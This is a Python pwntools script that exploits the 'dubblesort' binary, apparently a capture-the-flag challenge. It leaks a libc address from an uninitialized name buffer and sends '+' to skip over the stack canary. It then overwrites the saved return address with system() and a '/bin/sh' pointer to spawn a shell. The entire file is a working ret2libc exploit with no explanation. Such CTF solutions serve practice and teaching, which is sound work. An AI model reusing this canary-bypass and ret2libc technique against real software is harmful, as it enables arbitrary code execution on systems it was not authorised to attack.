import os
from pwn import *

libc = ELF('libc_32.so.6')
dubblesort = ELF('dubblesort')


CANARY_OFFSET = 0x18
RET_OFFSET = 0x20
LEAK_ADDR_OFFSET = 0x1ae244
SH_OFFSET = 0x1562F5


class Prompts:
    NAME = 'name :'
    NUMS_COUNT = 'sort :'
    NUM = 'number : '


p = process(dubblesort.path, env=dict(LD_PRELOAD=libc.path))
num_count = 34
p.sendafter(Prompts.NAME, 'A' * 4 * 7)
libc_rand_addr = p.sendlineafter(Prompts.NUMS_COUNT, str(num_count))[34:38]
libc_base_addr = u32(libc_rand_addr) - LEAK_ADDR_OFFSET
system_addr = libc_base_addr + libc.symbols['system']
sh_addr = libc_base_addr + SH_OFFSET
print(f'[*] Libc base address: {hex(libc_base_addr)}')
for i in range(num_count):
    if i == RET_OFFSET:
        p.sendlineafter(Prompts.NUM, str(system_addr))
    elif i == RET_OFFSET + 1:
        p.sendlineafter(Prompts.NUM, str(sh_addr))
    elif i == CANARY_OFFSET:
        p.sendlineafter(Prompts.NUM, '+')
    elif i > CANARY_OFFSET:
        p.sendlineafter(Prompts.NUM, str(0xaaaaaaaa))
    else:
        p.sendlineafter(Prompts.NUM, str(i))
